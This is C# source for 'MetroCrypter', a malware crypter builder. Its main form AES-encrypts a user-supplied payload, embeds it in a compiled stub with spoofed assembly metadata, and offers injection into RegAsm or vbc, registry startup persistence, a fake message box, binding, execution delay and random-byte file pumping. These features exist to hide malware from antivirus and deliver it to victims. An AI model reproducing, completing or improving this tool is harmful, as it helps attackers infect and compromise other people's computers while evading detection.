using System;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using MetroCrypter.Resources;

using System.Text;
using System.Resources;
using System.Security.Cryptography;

namespace MetroCrypter
{
    /// <summary>
    /// Stub and cryptography made by the owner of ForceCrypter (NOT ME).
    /// UI made by ryanallen HF
    /// </summary>
    public partial class Form1 : Form
    {   
    // <formdeclare>

    Options op;
    Forms.ProfileDialog PD;
    Assembly ass;
        Forms.Binding Bnd;

    /// </formdeclare>
        
        public class CID
        {
            /// <summary>

            /// </summary>
            // <returns>

            public static bool PDreply { get; set; }
            public static bool startupreply { get; set; }
            public static bool fpreply { get; set; }
            public static bool fmreply { get; set; }
            public static bool tmreply { get; set; }
            public static bool BindReply { get; set; }
        
            // </returns>
            // <assembly>

            public static string title { get; set; }
            public static string description { get; set; }
            public static string company { get; set; }
            public static string product { get; set; }
            public static string version { get; set; }
            public static string copyright { get; set; }
            public static string trademark { get; set; }
            public static string JunkScript { get; set; }
            public static string fversion { get; set; }
            // </assembly>
            public static string ijtype { get; set; }
            // <options>
            public static string filename { get; set;}
            public static string iconame { get; set; }
                  // <binding>
                  public static string binding { get; set; }
                 
                  // </binding>

                  // <startup>
                  public static string FolderName { get; set;}
                  public static string Sfilename { get; set;}
                  public static string RegistKey { get; set; }
                  // </startup>

                  // <pump>
                  public static string txtPump { get; set;}
                  // </pump>

                  // <fakemessage>
                  public static string Title { get; set;}
                  public static string Message { get; set;}
                  // </fakemessage>
                  
                  // <timer>
                  public static string delay { get; set;}
                  // </timer>
            // </options>

        }
        public Form1()
        {
            MessageBox.Show("By opening this software you agree to the Terms of service\nyou read when you bought this software.","Terms of service.");
            CID.fpreply = false;
            CID.startupreply = false;
            CID.PDreply = false;
            CID.tmreply = false;
            CID.fmreply = false;
            CID.fpreply = false;
            CID.BindReply = false;
            InitializeComponent();

        }
        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            if (m.Msg == WM_NCHITTEST)
                m.Result = (IntPtr)(HT_CAPTION);
        }

      





        private const int WM_NCHITTEST = 0x84;
        private const int HT_CLIENT = 0x1;
        private const int HT_CAPTION = 0x2;

        public string RandomString(int length)
        {
            //Making a random string from the basketofdeplorables
            string basketofdeplorables = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWKYZ1234567890";
            basketofdeplorables += basketofdeplorables.ToUpper();
            string tmp = "";
            Random Ryan = new Random();
            for (int x = 0; x < length; x++)
            {
                tmp += basketofdeplorables[Ryan.Next(0, basketofdeplorables.Length)].ToString();
            }
            return tmp;
        }

        public string RandomNumber(int _length)
        {
            //Making a random number for the random assemblys version
            string basketofdeplorables = "0123456789";
            basketofdeplorables += basketofdeplorables.ToUpper();
            string tmp = "";
            Random Ryan = new Random();
            for (int x = 0; x < _length; x++)
            {
                tmp += basketofdeplorables[Ryan.Next(0, basketofdeplorables.Length)].ToString();
            }
            return tmp;
        }




        private string RandomNumberarray(int _length)
        {
            //Making a random number for the random assemblys version
            string pool = "0123456789";

            string tmp = "";
            Random R = new Random();
            for (int x = 0; x < _length; x++)
            {
                tmp += pool[R.Next(0, pool.Length)].ToString();
            }
            return tmp;
        }

        private void CryptButton_Click(object sender, EventArgs e)
        {
        
            if (String.IsNullOrEmpty(CID.filename))
            {
                MessageBox.Show("No stub found");
            }
            else if(String.IsNullOrEmpty(CID.ijtype))
            {
                MessageBox.Show("Please set an injection type");
            }
            else if (
                String.IsNullOrEmpty(CID.title) || String.IsNullOrEmpty(CID.version)
                )
            {
                MessageBox.Show("You haven't entered the assembly");
            }

            else
            {
       
                SaveFileDialog FSave = new SaveFileDialog()
                {
                    Filter = "Executable Files|*.exe",
                    InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                };


                //If he choose and everything is good
                if (FSave.ShowDialog() == DialogResult.OK)
                {

             
                    string thegoofstuff = Properties.Resources.thegoofstuff;
                 
                    thegoofstuff = thegoofstuff.Replace("[title_01]", CID.title);
                    thegoofstuff = thegoofstuff.Replace("[company_01]", CID.company);
                    thegoofstuff = thegoofstuff.Replace("[product_01]", CID.product);
                    thegoofstuff = thegoofstuff.Replace("[copyright_01]", CID.copyright);
                    thegoofstuff = thegoofstuff.Replace("[trademark_01]", CID.trademark);
                    thegoofstuff = thegoofstuff.Replace("[desc_01", CID.description);
                    thegoofstuff = thegoofstuff.Replace("[version_01]", CID.version);
                    thegoofstuff = thegoofstuff.Replace("[fversion_01]", CID.fversion);

                    if (CID.startupreply == true)
                    {
                        thegoofstuff = thegoofstuff.Replace("[startup_01]", "true");
                        thegoofstuff = thegoofstuff.Replace("[regfname_01]", CID.FolderName);
                        thegoofstuff = thegoofstuff.Replace("[regfiname_01]", CID.Sfilename);
               
                    }




                    if (CID.ijtype == "Itself")
                    {
                        thegoofstuff = thegoofstuff.Replace("[_ijto]", "[IS]");                
                    }
                    else if (CID.ijtype == "RegAsm")
                    {
                     thegoofstuff = thegoofstuff.Replace("[_ijto]", "[RE]");
                    }
                    else
                    {
                    thegoofstuff = thegoofstuff.Replace("[_ijto]", "[VBC]");
                    }



                    string encryptionkey = RandomString(300);
                    //Replacing the key in the stub with our encryption key
                    thegoofstuff = thegoofstuff.Replace("[key-replace]", encryptionkey);
                    //Reading the bytes from our payload
                    byte[] fBytes = File.ReadAllBytes(CID.filename);
                    //Crypting process
                    string fCrypted = Convert.ToBase64String(fBytes);
                    //Crypting process
                    byte[] first = Encoding.UTF8.GetBytes(fCrypted);
                    //Getting the bytes from the encryption key
                    byte[] enckey = Encoding.UTF8.GetBytes(encryptionkey);
                    //Making a hash for the key
                    enckey = SHA256.Create().ComputeHash(enckey);
                    //Encrypting the bytes of the payload
                    byte[] encBytes = Encboop.AESEncrypt(first, enckey);

                    if (CID.delay != String.Empty)
                        thegoofstuff = thegoofstuff.Replace("[delay_01]", CID.delay);
                    if (CID.delay == "" | CID.delay == null)
                        thegoofstuff = thegoofstuff.Replace("[delay_01]", "0");

                    string ResF = Path.Combine(Application.StartupPath, "Encrypted.resources");
                    bool work;
       
                    

               
                    using (var Writer = new ResourceWriter(ResF))
                    {
                        //Adding the encrypted bytes to the resource file
                        Writer.AddResource("encfile", encBytes);

                        Writer.Generate();
                    }

                    if (File.Exists(CID.iconame))
                    {
                       

                        work = Compiler.CompileFromSource(thegoofstuff, FSave.FileName, CID.iconame, new string[] { ResF });
                    }
                    else
                        work = Compiler.CompileFromSource(thegoofstuff, FSave.FileName, null, new string[] { ResF });

                    if (work == true)
                    {

                        
                        if (CID.fpreply == true)
                        {
                            _Pump(FSave.FileName, Int32.Parse(CID.txtPump) * 8 * 124, true);
                            
                        }
                        else
                        {
                            //// adds some bytes;
                            _Pump(FSave.FileName, Int32.Parse(RandomNumber(2)) * 8 * 124, true);
                        }
                                            MessageBox.Show("Stub Formed");
                    }

                }

            }


        }

        private static void CombineMultipleFilesIntoSingleFile(string inputDirectoryPath, string inputFileNamePattern, string outputFilePath)
        {
            string[] inputFilePaths = Directory.GetFiles(inputDirectoryPath, inputFileNamePattern);

            using (var outputStream = File.Create(outputFilePath))
            {
                foreach (var inputFilePath in inputFilePaths)
                {
                    using (var inputStream = File.OpenRead(inputFilePath))
                    {
                        // Buffer size can be passed as the second argument.
                        inputStream.CopyTo(outputStream);
                    }
                    
                }
            }
        }
        public void _Pump(string file, int amount, bool random)
        {
            //Pumping function
            
            FileStream fs = new FileStream(file, FileMode.Append, FileAccess.Write);
            byte[] bytes = new byte[amount];
            if (random)
            {
                Random rand = new Random();
                rand.NextBytes(bytes);
            }
            fs.Write(bytes, 0, amount);
            fs.Close();
        }
        private void button2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }


        private void OptionsButton_Click(object sender, EventArgs e)
        {
            op = new Options();
            op.ShowDialog();
        }



        private void Form1_Load(object sender, EventArgs e)
        {

        }


        private void button2_Click_1(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            PD = new Forms.ProfileDialog();
            PD.ShowDialog();

        }

        private void BindButton_Click(object sender, EventArgs e)
        {
            Bnd = new Forms.Binding();
            Bnd.ShowDialog();
            
        }

        private void AssemblyButton_Click(object sender, EventArgs e)
        {
            ass = new Assembly();
            ass.ShowDialog();
        }

  

     

        private void button6_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Made by : RyanAllen HF \nAll Rights Reserved");
        }

        private void button5_Click(object sender, EventArgs e)
        {
            System.Diagnostics.ProcessStartInfo proc = new System.Diagnostics.ProcessStartInfo("https://www.pscan.xyz/");
            Process.Start(proc);
        }
    }
}
